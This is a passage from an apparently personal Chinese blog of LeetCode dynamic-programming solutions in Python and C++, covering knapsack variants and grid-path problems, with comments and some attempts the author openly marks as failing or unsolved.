range(k, -1, -1): for c in range(n, 0, -1): if num &lt;= j: f[j][c] = f[j - num][c - 1] % MOD + f[j][c] % MOD ans = 0 pow2 = 1 for i in range(n, 0 , -1): ans += f[k][i] * pow2 pow2 = pow2 * 2 return ans % MOD ## return dfs() def dfs(): f = [1] + [0] * k for x in nums: for j in range(k, -1, -1): f[j] = (f[j] * 2 + (f[j - x] if j &gt;= x else 0)) % MOD return f[k] return dfs() 最高的广告牌source: 956. 最高的广告牌 123456789101112131415class Solution: def tallestBillboard(self, rods: List[int]) -&gt; int: n = len(rods) s = sum(rods) @cache def dfs(i, j): ## 从前i个元素中选择,添加到集合A或者集合B, 使得集合的差值为0, if i &lt; 0 : return 0 if j == 0 else -inf return max(dfs(i-1, j), rods[i] + dfs(i-1,j + rods[i]), dfs(i-1, j - rods[i])) return dfs(n - 1, 0) 好分区的数目source: 2518. 好分区的数目 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class Solution: def countPartitions(self, nums: List[int], k: int) -&gt; int: MOD = 10 ** 9 + 7 n = len(nums) s = sum(nums) @cache def dfs(i, m, n): ## 从前i个数中选择, 使得和为j的划分数 if i &lt; 0: return 1 if m &lt;= 0 and n &gt;= k else 0 return dfs(i - 1, m, n) % MOD + dfs(i - 1, m - nums[i], n - nums[i]) % MOD def dfs(): f = [[0] * (s + 1) for _ in range(k + 1)] for i in range(s + 1): if i &gt;= k: f[0][i] = 1 for num in nums: for m in range(k, -1, -1): for n in range(s, num -1, -1): f[m][n] = f[m][n] % MOD + f[max(0, m - num)][n - num] % MOD return f[k][s] % MOD @cache def dfs(i, m): if i &lt; 0: return 1 if m &lt;= 0 and s + m - k &gt;= k else 0 return dfs(i - 1, m) % MOD + dfs(i - 1, m - nums[i]) % MOD ## return dfs(n - 1, k) def dfs(): if s &lt; k: return 0 f = [[0] * (2 * s + 1) for _ in range(n + 1)] for i in range(2 * s + 1): index = i - s if index &lt;= 0 and s + index - k &gt;= k : f[0][i] = 1 for i, num in enumerate(nums): for m in range(2 * s + 1): mm = m - s f[i+1][mm] = f[i][mm] % MOD + f[i][mm - num] % MOD return f[n][k + s] ## return dfs() % MOD ## 通过计算坏分区的数量, 用总的分区数减去坏分区数则是好分区数 def dfs(): if s &lt; k * 2: return 0 f = [0] * k f[0] = 1 for x in nums: for j in range(k - 1, x - 1, -1): f[j] = (f[j] + f[j - x]) % MOD return (pow(2, len(nums), MOD) - sum(f) * 2) % MOD return dfs() 给墙壁刷油漆source: 2742. 给墙壁刷油漆 12345678910111213141516171819202122232425class Solution: def paintWalls(self, cost: List[int], time: List[int]) -&gt; int: @cache def dfs(i, j): if j &lt;= 0: return 0 if i &lt; 0: return inf return min(dfs(i - 1, j - time[i] - 1) + cost[i], dfs(i - 1, j)) ## n = len(cost) ## return dfs(n - 1, n) def dfs(): n = len(cost) f = [0] + [inf] * n for c, t in zip(cost, time): for j in range(n, 0, -1): f[j] = min(f[j], f[max(j - t - 1, 0)] + c) return f[n] return dfs() 求出数组中最大序列值source: 3287. 求出数组中最大序列值 做了好多天都没解决(哭) 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Solution: def maxValue(self, nums: List[int], k: int) -&gt; int: n = len(nums) @cache def dfs(i, j, v1, v2): if j == 0: return v1 ^ v2 if i &lt; 0: return -inf if j &gt; k: return max(dfs(i - 1, j - 1, v1, nums[i] | v2), dfs(i - 1, j, v1, v2)) else: return max(dfs(i - 1, j - 1, nums[i] | v1, v2), dfs(i - 1, j, v1, v2)) ## return dfs(n - 1, 2 * k, 0, 0) def dfs(): @cache def left(i, j, v1, target): if j == 0: return True if v1 == target else False if i &lt; 0: return False return left(i - 1, j - 1, nums[i] | v1, target) or left(i - 1, j, v1, target) @cache def right(i, j, v2, target): if j == 0: return True if v2 == target else False if i &gt; n - 1: return False return right(i + 1, j - 1, v2 | nums[i], target) or right(i + 1, j, v2, target) m = 1 &lt;&lt; 7 ans = -inf for i in range(k - 1, n - k): for x in range(0, m + 1): for y in range(0, m + 1): if left(i, k, 0, x) and right(i + 1, k, 0, y): ans = max(ans, x ^ y) return ans ## return dfs() 完全背包零钱兑换source: 322. 零钱兑换 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution: def coinChange(self, coins: List[int], amount: int) -&gt; int: @cache def dfs(i, c): ## 记忆化搜索 if i &lt; 0: return 0 if c == 0 else inf if c &lt; coins[i]: return dfs(i - 1, c) return min(dfs(i - 1, c), dfs(i, c - coins[i]) + 1) ## n = len(coins) ## ans = dfs(n - 1, amount) ## return ans if ans != inf else -1 def dfs(): ## 动态规划 n = len(coins) f = [[inf] * (amount + 1) for _ in range(n + 1)] f[0][0] = 0 for i,x in enumerate(coins): for c in range(amount + 1): if c &gt;= x: f[i + 1][c] = min(f[i][c], f[i + 1][c - x] + 1) else: f[i + 1][c] = f[i][c] return f[n][amount] ## ans = dfs() ## return ans if ans &lt; inf else -1 def dfs(): ## 动态规划 空间优化 f = [inf] * (amount + 1) f[0] = 0 for x in coins: for c in range(x, amount + 1): f[c] = min(f[c], f[c - x] + 1) return f[amount] ans = dfs() return ans if ans &lt; inf else -1 完全平方数source: 279. 完全平方数 123456789101112131415161718192021222324252627282930313233343536@cachedef dfs(i, c): if i == 0: return inf if c else 0 if i * i &gt; c: return dfs(i - 1, c) else: return min(dfs(i - 1, c), dfs(i, c - i * i) + 1)N = 10000m = isqrt(N)f = [[inf] * (N + 1) for _ in range(m + 1)]f[0][0] = 0for i in range(1, len(f)): for j in range(N + 1): if i * i &gt; j: f[i][j] = f[i - 1][j] else: f[i][j] = min(f[i - 1][j], f[i][j - i * i] + 1)class Solution: def numSquares(self, n: int) -&gt; int: def dfs(): m = isqrt(n) f = [inf] * (n + 1) f[0] = 0 for i in range(m): for j in range((i + 1) * (i + 1), n + 1): f[j] = min(f[j], f[j - (i + 1) * (i + 1)] + 1) return f[n] return dfs() 零钱兑换 IIsource: 518. 零钱兑换 II 1234567891011121314151617181920212223242526class Solution: def change(self, amount: int, coins: List[int]) -&gt; int: @cache def dfs(i, j): if i &lt; 0: return 1 if j == 0 else 0 if coins[i] &gt; j: return dfs(i - 1, j) return dfs(i - 1, j) + dfs(i, j - coins[i]) ## n = len(coins) ## return dfs(n - 1, amount) def dfs(): n = len(coins) f = [0] * (amount + 1) f[0] = 1 for i, coin in enumerate(coins): for j in range(coin, amount + 1): f[j] = f[j] + f[j - coin] return f[amount] return dfs() 数位成本和为目标值的最大数字source: 1449. 数位成本和为目标值的最大数字 12345678910111213141516171819202122232425262728293031323334353637383940414243444546sys.set_int_max_str_digits(50000)class Solution: def largestNumber(self, cost: List[int], target: int) -&gt; str: ## 记忆化搜索 @cache def dfs(i, j): if i &lt; 0: return 0 if j == 0 else -inf if cost[i] &gt; j: return dfs(i - 1, j) else: l = 10 ** len(str(dfs(i, j - cost[i]))) return max(dfs(i - 1, j), (i + 1) * l + dfs(i, j - cost[i])) sys.set_int_max_str_digits(50000) n = len(cost) ans = dfs(n - 1, target) ans = str(ans) if ans &gt; -inf else &quot;00&quot; return ans[0:-1] ## 动态规划 def dfs(): f = [-inf] * (target + 1) f[0] = 0 for i, v in enumerate(cost): for j in range(v, target + 1): l = 10 ** len(str(f[j - v])) f[j] = max(f[j], (i + 1) * l + f[j - v]) return f[target] sys.set_int_max_str_digits(50000) ans = dfs() ans = str(ans) if ans &gt; -inf else &quot;00&quot; return ans[0:-1] ## 动态规划 def dfs(): f = [-inf] * (target + 1) f[0] = 0 for i in range(8, -1, -1): v = cost[i] for j in range(v, target + 1): f[j] = max(f[j],f[j - v] * 10 + (i + 1)) return f[target] ans = dfs() return str(ans) if ans &gt; -inf else &quot;0&quot; 多重背包获得分数的方法数source: 2585. 获得分数的方法数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class Solution: def waysToReachTarget(self, target: int, types: List[List[int]]) -&gt; int: MOD = 10 ** 9 + 7 @cache def dfs(i, j): if i &lt; 0: return 1 if j == 0 else 0 ans = 0 for k in range(0, types[i][0] + 1): if k * types[i][1] &lt;= j: ans += dfs(i - 1, j - k * types[i][1]) return ans ## n = len(types) ## return dfs(n - 1, target) % MOD def dfs(): n = len(types) f = [[0] * (target + 1) for _ in range(n + 1)] f[0][0] = 1 for i in range(0, len(types)): for j in range(0, target + 1): for k in range(0, types[i][0] + 1): if k * types[i][1] &lt;= j: f[i + 1][j] += f[i][j - k * types[i][1]] % MOD for i in range(len(f)): for j in range(len(f[i])): print(i, j, f[i][j]) return f[n][target] % MOD ## return dfs() def dfs(): n = len(types) f = [[0] * (target + 1) for _ in range(2)] f[0][0] = 1 for i in range(0, n): for j in range(target + 1): f[(i + 1) % 2][j] = 0 for j in range(0, target + 1): for k in range(0, types[i][0] + 1): if k * types[i][1] &lt;= j: f[(i + 1) % 2][j] += f[i % 2][j - k * types[i][1]] % MOD return f[n % 2][target] % MOD return dfs() 找到初始输入字符串 II没有解决, 超出时间限制 source: 3333. 找到初始输入字符串 II 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869class Solution: def possibleStringCount(self, word: str, k: int) -&gt; int: MOD = 10**9 + 7 cnt = [0] * len(word) current = word[0] index = 0 for item in word: if current != item: current = item index += 1 cnt[index] += 1 cnt = list(filter(lambda x: x &gt; 0, cnt)) cnt = [x - 1 for x in cnt] m = len(cnt) @cache def dfs(i, c): if i &lt; 0: return 1 if c &lt;= 0 else 0 ans = 0 for k in range(0, cnt[i] + 1): ans += dfs(i - 1, c - k) % MOD return ans ## return dfs(m - 1, k - m) % MOD def dfs(): target = k - m target = max(target, 0) f = [[0] * (target + 1) for _ in range(2)] f[0][0] = 1 for i in range(m): for j in range(target + 1): f[(i + 1) % 2][j] = 0 for j in range(target + 1): for kk in range(cnt[i] + 1): f[(i + 1) % 2][j] += f[i % 2][max(0, j - kk)] % MOD return f[m % 2][target] % MOD ## return dfs() def dfs(): target = k - m target = max(target, 0) f = [[0] * (target + 1) for _ in range(2)] f[0][0] = 1 for i in range(m): for j in range(target + 1): f[(i + 1) % 2][j] = 0 for j in range(target + 1): for kk in range(cnt[i] + 1): f[(i + 1) % 2][j] += f[i % 2][max(0, j - kk)] % MOD return f[m % 2][target] % MOD return dfs() 分组背包掷骰子等于目标和的方法数source: 1155. 掷骰子等于目标和的方法数 123456789101112131415161718192021222324252627282930class Solution: def numRollsToTarget(self, n: int, k: int, target: int) -&gt; int: MOD = 10**9 + 7 @cache def dfs(i, target): if i == 0: return 1 if target == 0 else 0 ans = 0 for point in range(1, k + 1): ans += dfs(i - 1, target - point) % MOD return ans % MOD ## return dfs(n, target) def dfs(): f = [[0] * (target + 1) for _ in range(2)] f[0][0] = 1 for i in range(n): for j in range(target + 1): f[(i + 1) % 2][j] = 0 for j in range(target + 1): for point in range(1, k + 1): if point &lt;= j: f[(i + 1) % 2][j] += f[i % 2][j - point] % MOD return f[n % 2][target] % MOD ## return dfs()","link":"/posts/bfec72ca.html"},{"title":"网格图DP","text":"题单来源: 灵茶山艾府 珠宝的最高价值题目来源：LCR 166.珠宝的最高价值 1234567891011121314151617181920212223242526class Solution {public: int jewelleryValue(vector&lt;vector&lt;int&gt;&gt;&amp; frame) { // 共 m + n步 // dp[i][j] = frame[i][j] + max(dp[i -1][j], dp[i][j-1]); int row = frame.size(), column = frame[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(row, vector&lt;int&gt;(column)); dp[0][0] = frame[0][0]; for (int i = 1; i &lt; row; i++) { dp[i][0] = dp[i - 1][0] + frame[i][0]; } for (int i = 1; i &lt; column; i++) { dp[0][i] = dp[0][i - 1] + frame[0][i]; } for (int i = 1; i &lt; row; i++) { for (int j = 1; j &lt; column; j++) { dp[i][j] = max(dp[i - 1][j], dp[i][j - 1]) + frame[i][j]; } } return dp[row - 1][column - 1]; }}; 不同路径题目来源：62.不同路径 123456789101112131415161718192021222324252627282930class Solution {public: // 1.组合数学 // 总共需要走 m + n - 2 步， 其中有m - 1步向下走，总方法数为(m + n - 2, m - 1) int uniquePaths(int m, int n) { long long ans = 1; for (int x = n, y = 1; y &lt; m; ++x, ++y) { ans = ans * x / y; } return ans; } // =============================================================== // 2.动态规划 int dp[m][n]; for(int i = 0; i &lt; m; i++ ) { dp[i][0] = 1; } for(int j = 0; j &lt; n; j++) { dp[0][j] = 1; } for(int i = 1; i &lt; m; i++) { for(int j = 1; j &lt; n; j++) { dp[i][j] = dp[i - 1][j] + dp[i][j - 1]; } } return dp[m - 1] [n - 1];}; 不同路径 II题目来源 63.不同路径 II 12345678910111213141516171819202122232425262728293031323334class Solution {public: int uniquePathsWithObstacles(vector&lt;vector&lt;int&gt;&gt;&amp; obstacleGrid) { int rowLen = obstacleGrid.size(); int columnLen = obstacleGrid[0].size(); int dp[rowLen][columnLen]; int reachable = 1; for (int i = 0; i &lt; rowLen; i++) { if (obstacleGrid[i][0] == 1) // 不可达 reachable = 0; dp[i][0] = reachable; } reachable = 1; for (int j = 0; j &lt; columnLen; j++) { if (obstacleGrid[0][j] == 1) reachable = 0; dp[0][j] = reachable; } for (int i = 1; i &lt; rowLen; i++) { for (int j = 1; j &lt; columnLen; j++) { if (obstacleGrid[i][j] == 1) { dp[i][j] = 0; } else { dp[i][j] = dp[i - 1][j] + dp[i][j - 1]; } } } return dp[rowLen - 1][columnLen - 1]; }}; 最小路径和题目来源：64.最小路径和 123456789101112131415161718192021222324class Solution {public: int minPathSum(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int row = grid.size(), cloumn = grid[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(row, vector&lt;int&gt;(cloumn)); dp[0][0] = grid[0][0]; for(int i = 1; i &lt; row; i++) { dp[i][0] = dp[i - 1][0] + grid[i][0]; } for(int j = 1; j &lt; cloumn; j++) { dp[0][j] = dp[0][j - 1] + grid[0][j]; } for (int i = 1; i &lt; row; i++) { for (int j = 1; j &lt; cloumn; j++) { dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j]; } } return dp[row - 1][cloumn - 1]; }}; 三角形的最小路径和题目来源：120.三角形的最小路径和 123456789101112131415161718class Solution {public: int minimumTotal(vector&lt;vector&lt;int&gt;&gt;&amp; triangle) { int row = triangle.size(); vector&lt;vector&lt;int&gt;&gt; dp(row); dp[0].push_back(triangle[0][0]); for(int i = 1; i &lt; row; i++) { for(int j = 0; j &lt;= i; j++) { if(j == 0) dp[i].push_back(dp[i-1][j] + triangle[i][j]); else if(j == i ) dp[i].push_back(dp[i - 1][j - 1] + triangle[i][j]); else dp[i].push_back(min(dp[i-1][j-1], dp[i-1][j]) + triangle[i][j]); } } return *min_element(dp[row-1].begin(), dp[row - 1].end()); }}; 下降路径和题目来源：931.下降路径和 12345678910111213141516171819202122232425262728293031323334class Solution {public: int minFallingPathSum(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) { int row = matrix.size(); vector&lt;vector&lt;int&gt;&gt; dp(row, vector&lt;int&gt;(row)); for (int i = 0; i &lt; row; i++) { dp[0][i] = matrix[0][i]; } for (int i = 1; i &lt; row; i++) { for (int j = 0; j &lt; row; j++) { if (j == 0) dp[i][j] = min(dp[i - 1][j], dp[i - 1][j + 1]) + matrix[i][j]; else if (j == row - 1) dp[i][j] = min(dp[i - 1][j], dp[i - 1][j - 1]) + matrix[i][j]; else dp[i][j] = min(dp[i - 1][j], min(dp[i - 1][j + 1], dp[i - 1][j - 1])) + matrix[i][j]; } } int min = dp[row - 1][0]; for (int i = 1; i &lt; row; i++) { if (dp[row - 1][i] &lt; min) min = dp[row - 1][i]; } return min; }}; 矩阵中移动的最大次数source: 2684. 矩阵中移动的最大次数 1 网格中的最小路径代价题目来源：2304.网格中的最小路径代价 12345678910111213141516171819202122class Solution {public: int minPathCost(vector&lt;vector&lt;int&gt;&gt;&amp; grid, vector&lt;vector&lt;int&gt;&gt;&amp; moveCost) { int row = grid.size(), col = grid[0].size(); vector&lt;int&gt; dp(grid[0]); for (int i = 1; i &lt; row; i++) { vector&lt;int&gt; newDp(col, INT_MAX); for (int j = 0; j &lt; col; j++) { for (int jj = 0; jj &lt; col; jj++) { int cost = moveCost[grid[i - 1][jj]][j] + dp[jj]; newDp[j] = min(newDp[j], cost); } newDp[j] += grid[i][j]; } dp = newDp; } return *min_element(dp.begin(), dp.end()); }}; 下降路径最小和 Ⅱ题目来源：1289.下降路径最小和 123456789101112131415161718192021222324252627282930class Solution {public: int minFallingPathSum(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int n = grid.size(); vector&lt;int&gt; dp(grid[0]); // 初始化 dp 为第一行的值 for (int i = 1; i &lt; n; i++) { int min1 = INT_MAX, min2 = INT_MAX; // 找到上一行中的最小值和次小值 for (int j = 0; j &lt; n; j++) { if (dp[j] &lt; min1) { min2 = min1; min1 = dp[j]; } else if (dp[j] &lt; min2) { min2 = dp[j]; } } vector&lt;int&gt; newDp(n); for (int j = 0; j &lt; n; j++) { // 如果 dp[j] 是上一行的最小值，使用次小值，否则使用最小值 newDp[j] = grid[i][j] + (dp[j] == min1 ? min2 : min1); } dp = newDp; // 更新 dp 为当前行的值 } return *min_element(dp.begin(), dp.end()); // 返回最后一行的最小值 }}; 矩阵的最大非负积题目来源：1594.矩阵的最大非负积 1234567891011121314151617181920212223242526272829303132333435363738class Solution {public: int maxProductPath(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int m = grid.size(), n = grid[0].size(); long long magic = 1e9 + 7; vector&lt;long long&gt; maxProd(n), minProd(n); maxProd[0] = minProd[0] = grid[0][0]; // 填充第一行 for (int j = 1; j &lt; n; j++) { maxProd[j] = minProd[j] = grid[0][j] * maxProd[j - 1]; } for (int i = 1; i &lt; m; i++) { vector&lt;long long&gt; maxProdNew(n), minProdNew(n); maxProdNew[0] = minProdNew[0] = grid[i][0] * maxProd[0]; for (int j = 1; j &lt; n; j++) { long current = grid[i][j]; // 从上方 maxProdNew[j] = max({current * maxProd[j], current * minProd[j]}); minProdNew[j] = min({current * maxProd[j], current * minProd[j]}); // 从左方 maxProdNew[j] = max({maxProdNew[j], current * maxProdNew[j - 1], current * minProdNew[j - 1]}); minProdNew[j] = min({minProdNew[j], current * maxProdNew[j - 1], current * minProdNew[j - 1]}); } maxProd = maxProdNew; minProd = minProdNew; } long long res = maxProd[n - 1]; return res &lt; 0 ? -1 : res % magic; }}; 最大得分的路径数目1301.最大得分的路径数目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475class Solution {public: vector&lt;int&gt; pathsWithMaxScore(vector&lt;string&gt;&amp; board) { int size = board.size(); long long magic = 1e9 + 7; vector&lt;long long&gt; dp(size, 0); vector&lt;long long&gt; count(size, 0); dp[size - 1] = 0; count[size - 1] = 1; for (int i = size - 2; i &gt;= 0; i--) { if (count[i + 1] == 0 || board[size - 1][i] == 'X') { dp[i] = 0; count[i] = 0; } else { long long current = board[size - 1][i] - '0'; dp[i] = dp[i + 1] + current; count[i] = count[i + 1]; } } for (int i = size - 2; i &gt;= 0; i--) { vector&lt;long long&gt; newDp(size, 0); vector&lt;long long&gt; newCount(size, 0); for (int j = size - 1; j &gt;= 0; j--) { if (board[i][j] == 'X') { newDp[j] = 0; newCount[j] = 0; continue; } long long current = board[i][j] - '0'; if (i == 0 &amp;&amp; j == 0) current = 0; long long cnt = 0; // 从下方 if (count[j] != 0) { // 可达 long long val = dp[j] + current; if (newDp[j] &lt; val) { // 比val小 newDp[j] = val; cnt = count[j]; } } // 从右方 if (j != size - 1 &amp;&amp; newCount[j + 1] != 0) { long long val = newDp[j + 1] + current; if (newDp[j] &lt; val) { newDp[j] = val; cnt = newCount[j + 1]; } else if (newDp[j] == val) { cnt += newCount[j + 1] % magic; } } // 从右下方 if (j != size - 1 &amp;&amp; count[j + 1] != 0) { long long val = dp[j + 1] + current; if (newDp[j] &lt; val) { newDp[j] = val; cnt = count[j + 1]; } else if (newDp[j] == val) { cnt += count[j + 1]; } } newCount[j] = cnt; } dp = newDp; count = newCount; } return {(int)dp[0], (int)(count[0] % magic)}; }}; 矩阵中和能被 K 整除的路径题目来源：2435.矩阵中和能被 K 整除的路径 最容易想到思路是 使用dp[i][j]记录从上一个顶点到该顶点的所有路径和，最后再遍历dp[m - 1][ n - 1]得出能被K整除的路径数 例如, 对于示例 1来说 当i = 0时, 只能向右方移动，所以dp[0][0] = {5}; dp[0][1] = {7}; dp[0][4] = {11} 坐标[1, 0], 只能从上方移动下来，所以dp[1][0] = {8} 坐标[1, 1]，可以从上和左两个方向得到, 所以dp[1] = {7 + 0; 8 + 0} = {7; 8} 坐标[1, 2], 左右两个方向 dp[1][2] = {7 + 5, 8 + 5; 11 + 5} = {11, 13; 16} 坐标[2, 0], dp = {8 + 0} = {8} 坐标[2, 1], dp = {8 + 7; 7 + 7, 8 + 7} = {15; 14, 15} 坐标[2, 2], dp = {15 + 2, 14 + 2, 15 + 2; 11 + 2, 13 + 2 ,16 + 2} = {17, 16, 17; 13, 15, 18}最后能被k = 3整除的有 15，18, 所以结果为2 因为路径和有多少个不清楚，所以可以使用vector.push_back()方法,同时可以看到特定一行的dp只依赖该行左边的值和该行上一行的值，所以可以只使用2行的 dp 数组，为了方便理解，可以将它们分开表示。于是就有了下面的代码 (有问题) 12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution {public: int numberOfPaths(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int k) { int m = grid.size(), n = grid[0].size(); int magic = 1e9 + 7; vector&lt;vector&lt;int&gt;&gt; dp(n); for (int j = 0; j &lt; n; j++) { if (j == 0) { dp[j].push_back(grid[0][0]); } else { for (int i = 0; i &lt; dp[j - 1].size(); i++) { dp[j].push_back(dp[j - 1][i] + grid[0][j]); } } } for (int i = 1; i &lt; m; i++) { vector&lt;vector&lt;int&gt;&gt; newDp(n); for (int j = 0; j &lt; n; j++) { // 从上 cout&lt;&lt;&quot;i == &quot; &lt;&lt; i &lt;&lt; &quot;,j == &quot;&lt;&lt;j&lt;&lt;endl; long cnt = 0; for (int kk = 0; kk &lt; dp[j].size(); kk++) { newDp[j].push_back(dp[j][kk] + grid[i][j]); } // 从左 if (j != 0) { for (int kk = 0; kk &lt; newDp[j - 1].size(); kk++) { newDp[j].push_back(newDp[j - 1][kk] + grid[i][j]); } } } dp = newDp; } long cnt = 0; for (int j = 0; j &lt; dp[n - 1].size(); j++) { if (dp[n - 1][j] % k == 0) cnt++; } return (int)cnt % magic; }}; leetcode 给出了超出了内存限制的提示，从上面的例子可以看到，当m = 3, n = 3时, dp[2][2]一共有6项，可以预想到当m，n特别大的时候，dp[m - 1][n - 1]就有特别多的项，特别消耗内存。 解决办法从上面的例子可以看到，最后的结果中17出现了两次，一种自然的想法是存储17和其出现的次数,这样只减少了一项，也就是一个int的大小。 但根据题意，对于mod 3这样的操作，16 % 3 = 13 % 3 = 1,16，13 的效果是一样的; 15 % 3 = 18 % 3 = 0,15， 18 的效果是一样 ，这种被称为等价类,所以dp[i][j]就可以只存0 到 k - 1和其出现的次数, 代码如下 12345678910111213141516171819202122232425262728293031323334353637class Solution {private: static const int magic = 1e9 + 7;public: int numberOfPaths(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int k) { int m = grid.size(), n = grid[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(n, vector&lt;int&gt;(k)); for (int j = 0; j &lt; n; j++) { if (j == 0) { dp[j][grid[0][0] % k] = 1; } else { for (int i = 0; i &lt; k; i++) { int t = (i + grid[0][j]) % k; dp[j][t] += dp[j - 1][i]; } } } for (int i = 1; i &lt; m; i++) { vector&lt;vector&lt;int&gt;&gt; newDp(n, vector&lt;int&gt;(k)); for (int j = 0; j &lt; n; j++) { for (int kk = 0; kk &lt; k; kk++) { int t = (kk + grid[i][j]) % k; newDp[j][t] = (newDp[j][t] + dp[j][kk]) % magic; // 从上 if (j != 0) { newDp[j][t] = (newDp[j][t] + newDp[j - 1][kk]) % magic; // 从左 } } } dp = newDp; } return dp[n - 1][0]; }}; 地下城游戏题目来源：174.地下城游戏 1234567891011121314151617181920212223242526272829class Solution {public: int calculateMinimumHP(vector&lt;vector&lt;int&gt;&gt;&amp; dungeon) { int m = dungeon.size(), n = dungeon[0].size(); vector&lt;int&gt; dp(n); // 初始化终点的生命值需求 dp[n - 1] = max(1, 1 - dungeon[m - 1][n - 1]); // 初始化最后一行的生命值需求 for (int j = n - 2; j &gt;= 0; j--) { dp[j] = max(1, dp[j + 1] - dungeon[m - 1][j]); } // 自底向上计算每一行 for (int i = m - 2; i &gt;= 0; i--) { // 先处理最右边的元素 dp[n - 1] = max(1, dp[n - 1] - dungeon[i][n - 1]); // 再处理其他元素 for (int j = n - 2; j &gt;= 0; j--) { int minHealth = min(dp[j], dp[j + 1]); dp[j] = max(1, minHealth - dungeon[i][j]); } } return dp[0]; }}; 矩阵中的最长递增路径题目来源: 329.矩阵中的最长递增路径 未使用gpt优化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class Solution {public: int longestIncreasingPath(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) { int m = matrix.size(), n = matrix[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 1)); vector&lt;vector&lt;bool&gt;&gt; isCheck(m, vector&lt;bool&gt;(n, false)); int re = 1; for (int i = 0; i &lt; m; i++) { for (int j = 0; j &lt; n; j++) { if (isCheck[i][j]) continue; dp[i][j] = update(i, j, matrix, dp, isCheck); if (dp[i][j] &gt; re) re = dp[i][j]; } } return re; } int update(int i, int j, vector&lt;vector&lt;int&gt;&gt;&amp; matrix, vector&lt;vector&lt;int&gt;&gt;&amp; dp, vector&lt;vector&lt;bool&gt;&gt;&amp; isCheck) { int m = matrix.size(), n = matrix[0].size(); if (i != 0 &amp;&amp; matrix[i][j] &lt; matrix[i - 1][j]) { if (isCheck[i - 1][j]) dp[i][j] = max(dp[i][j], dp[i - 1][j] + 1); else dp[i][j] = max(dp[i][j], update(i - 1, j, matrix, dp, isCheck) + 1); } if (i != m - 1 &amp;&amp; matrix[i][j] &lt; matrix[i + 1][j]) { if (isCheck[i + 1][j]) dp[i][j] = max(dp[i][j], dp[i + 1][j] + 1); else dp[i][j] = max(dp[i][j], update(i + 1, j, matrix, dp, isCheck) + 1); } if (j != 0 &amp;&amp; matrix[i][j] &lt; matrix[i][j - 1]) { if (isCheck[i][j - 1]) dp[i][j] = max(dp[i][j], dp[i][j - 1] + 1); else dp[i][j] = max(dp[i][j], update(i, j - 1, matrix, dp, isCheck) + 1); } if (j != n - 1 &amp;&amp; matrix[i][j] &lt; matrix[i][j + 1]) { if (isCheck[i][j + 1]) dp[i][j] = max(dp[i][j], dp[i][j + 1] + 1); else dp[i][j] = max(dp[i][j], update(i, j + 1, matrix, dp, isCheck) + 1); } isCheck[i][j] = true; return dp[i][j]; }}; 经过了gpt优化 123456789101112131415161718192021222324252627282930313233343536class Solution {public: int longestIncreasingPath(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) { int m = matrix.size(), n = matrix[0].size(); vector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 0)); // 初始化为0，表示未计算 int re = 1; for (int i = 0; i &lt; m; i++) { for (int j = 0; j &lt; n; j++) { if (dp[i][j] == 0) { // 仅当未计算时才进行更新 re = max(re, update(i, j, matrix, dp)); } } } return re; } int update(int i, int j, vector&lt;vector&lt;int&gt;&gt;&amp; matrix, vector&lt;vector&lt;int&gt;&gt;&amp; dp) { if (dp[i][j] != 0) // 已经计算过，直接返回 return dp[i][j]; int m = matrix.size(), n = matrix[0].size(); int dirs[4][2] = {{-1, 0}, {1, 0}, {0, -1}, {0, 1}}; dp[i][j] = 1; // 初始长度为1（包含自己） for (auto&amp; dir : dirs) { int x = i + dir[0], y = j + dir[1]; if (x &gt;= 0 &amp;&amp; x &lt; m &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; n &amp;&amp; matrix[x][y] &gt; matrix[i][j]) { dp[i][j] = max(dp[i][j], update(x, y, matrix, dp) + 1); } } return dp[i][j]; }}; 检查是否有合法括号字符串路径 (NOT AC)2267.检查是否有合法括号字符串路径 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384class Solution {public: bool has = false; int m; int n;public: bool hasValidPath(vector&lt;vector&lt;char&gt;&gt;&amp; grid) { vector&lt;char&gt; path; path.push_back(grid[0][0]); m = grid.size(), n = grid[0].size(); int balance = grid[0][0] == '(' ? 1 : -1; dfs(0, 0, balance, path, grid); return has; } void dfs(int i, int j, int balance, vector&lt;char&gt;&amp; path, vector&lt;vector&lt;char&gt;&gt;&amp; grid) { if (i == m - 1 &amp;&amp; j == n - 1 &amp;&amp; path.size() == 0) { has = true; return; } if (abs(balance) &gt; (m + n) / 2) { return; } if (balance &gt; 0 &amp;&amp; balance - (m - i + n - j) &gt; 0) return; if (balance &lt; 0 &amp;&amp; balance + (m - i + n - j) &lt; 0) return; if (balance &lt; 0 &amp;&amp; path.size() != 0) return; if (has) return; int dirs[2][2] = {{1, 0}, {0, 1}}; for (auto&amp; dir : dirs) { int x = i + dir[0], y = j + dir[1]; if (x &gt;= m || y &gt;= n) continue; char next = grid[x][y]; if (path.size() == 0) { path.push_back(next); if (next == '(') balance++; else balance--; dfs(x, y, balance, path, grid); path.pop_back(); if (next == '(') balance--; else balance++; } else { char current = path.back(); if (current == '(' &amp;&amp; next == ')') { path.pop_back(); balance--; dfs(x, y, balance, path, grid); path.push_back(current); balance++; } else { path.push_back(next); if (next == '(') balance++; else balance--; dfs(x, y, balance, path, grid); path.pop_back(); if (next == '(') balance--; else balance++; } } } }}; 